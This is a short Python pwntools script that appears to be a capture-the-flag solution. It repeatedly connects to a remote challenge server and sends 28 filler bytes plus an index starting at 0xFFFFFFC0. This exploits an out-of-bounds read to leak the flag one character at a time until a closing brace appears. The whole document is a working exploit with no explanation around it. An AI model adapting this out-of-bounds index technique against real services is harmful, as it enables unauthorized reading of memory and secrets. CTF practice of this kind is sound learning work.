from pwn import *

context.binary = exe = ELF('./chal')
context.log_level = 'critical'

idx = 0xFFFFFFC0

while(1):
    io = remote('amt.rs', 31631)
    #io = process()
    io.recvuntil(b'hex: \n')
    payload = b'i'*28 + p32(idx)
    io.sendline(payload)
    c = bytes.fromhex(io.recvline(keepends=False).decode()).decode()
    io.close()
    print(c, end='')
    idx += 1
    if c == '}':
        break